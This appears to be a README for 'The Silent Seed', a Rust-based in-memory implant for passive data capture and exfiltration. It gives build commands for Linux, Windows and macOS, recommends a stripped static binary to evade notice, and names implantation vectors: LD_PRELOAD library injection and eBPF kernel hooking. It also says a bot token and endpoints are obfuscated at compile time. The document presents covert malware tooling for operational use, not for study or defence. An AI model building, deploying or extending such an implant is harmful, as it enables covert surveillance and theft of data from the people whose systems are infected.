# Component A: The Silent Seed

## Quick Start

### Using Automation Scripts

```bash
# Build all components (includes Silent Seed)
./scripts/build-all.sh

# Run tests
./scripts/test-all.sh
```

### Manual Building

```bash
# Linux
cd protosyte-seed
cargo build --release

# Windows
cd protosyte-seed-windows
cargo build --release --target x86_64-pc-windows-msvc

# macOS
cd protosyte-seed-macos
cargo build --release --target x86_64-apple-darwin
```

## Overview

Rust-based in-memory implant for passive data capture and exfiltration.

## Building

```bash
# Standard build
cargo build --release

# Minimal, static, stripped binary (recommended)
RUSTFLAGS='-C panic=abort -C strip=symbols -C opt-level=z' \
cargo build --release \
  --target x86_64-unknown-linux-musl
```

## Implantation Vectors

- **Vector A1**: Library injection via LD_PRELOAD
- **Vector A2**: eBPF kernel hooking (advanced)

## Configuration

Bot token and endpoints are obfuscated at compile time. See build scripts for details.

